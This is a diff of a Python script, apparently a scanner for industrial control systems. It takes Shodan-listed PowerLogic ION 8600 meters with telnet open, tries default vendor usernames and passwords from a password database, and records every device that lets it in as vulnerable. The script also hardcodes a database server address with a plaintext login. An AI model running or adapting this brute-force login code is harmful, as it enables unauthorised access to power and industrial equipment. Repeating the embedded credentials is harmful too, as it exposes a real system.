@@ -6,6 +6,7 @@ import telnetlib
 import MySQLdb
 import urllib
 import json
+import re
 
 db = MySQLdb.connect("128.196.27.147","ShodanTeam","Sh0d@n7e")
 
@@ -20,7 +21,7 @@ def connectTor():
 
     try:
         sql = "SELECT * FROM shodan.sy_sfs_scadashodan  \
-               WHERE portnum = 23"
+               WHERE queryname like '%8600%ION%' and port = 23"
 
             # % (keyword, keyword, keyword, keyword, keyword)
         try:
@@ -33,8 +34,8 @@ def connectTor():
                 passID = 0
             else:
                 for row in results:
-                    nicknm = row[2]
-                    ip = row[3]
+                    nicknm = row[32]
+                    ip = row[4]
                 # Now print fetched result
                     print "IP =%s, nick=%s" % \
                        (ip, nicknm)
@@ -42,8 +43,8 @@ def connectTor():
                     ipaddr = ip
                     #print('connected to device, no login')
 
-                    sql = "SELECT * FROM passworddb.scada \
-                           WHERE vendor = 'traffic cam'"
+                    sql = "SELECT * FROM passworddb.scadapasswords \
+                           WHERE vendor = 'Powerlogic%8600'"
 
                     try:
                         # Execute the SQL command
@@ -59,22 +60,21 @@ def connectTor():
                             HOST = ip
                             user = UserName
                             password = Password
-
+                            
+                            
                             tn = telnetlib.Telnet(HOST,'',2)
                             print "tel success"
-
+                            
                             try:
                                 line = tn.read_until("A$tring+hatWouldN0tExist", 3)
 
                                 strline = str(line)
                                 strline = strline.replace('\'','')
-                                line = strline
-
-                                if ("login" in line) or ("user" in line) or ("password" in line):
+                                line = strline.lower()
+                                #print line
+                                if ("login" in line) or ("user" in line) or ("password" in line) or ("closing connection" in line):
                                     try:
-                                        #print passID
-                                        #Username is also sometimes a option sometimes there is only a password
-                                        tn.read_until("login: ") or tn.read_until("user: ")
+                                        print passID
                                         try:
                                             tn.write(user + "\n")
                                             print "user success"
@@ -82,7 +82,9 @@ def connectTor():
                                             print "fail user write"
                                             tn.close()
                                         if password:
-                                            tn.read_until("Password: ")
+#                                             reg = re.compile("password", re.I)
+#                                             print tn.expect(reg)
+                                            tn.read_until("assword: ")
                                             try:
                                                 tn.write(password + "\n")
                                                 print "pass success"
@@ -90,13 +92,12 @@ def connectTor():
                                                 print "pass failure"
                                                 tn.close()
                                         try:
-                                            line = tn.read_until("A$tring+hatWouldN0tExist",3)
-
-                                            strline = str(line)
+                                            line2 = tn.read_until("A$tring+hatWouldN0tExist", 3)
+            
+                                            strline = str(line2)
                                             strline = strline.replace('\'','')
-                                            line = strline
-
-                                            if not (("user" in line)or("username" in line)or("login" in line)or("password" in line)):
+                                            line2 = strline.lower()
+                                            if not (("user:" in line2)or("username:" in line2)or("login:" in line2)or("password:" in line2)):
                                                 try:
                                                     #print passID
                                                     sql = "INSERT INTO vulnerablesystems.telnetvuln(ipaddr, passwordid, notes, openport) \
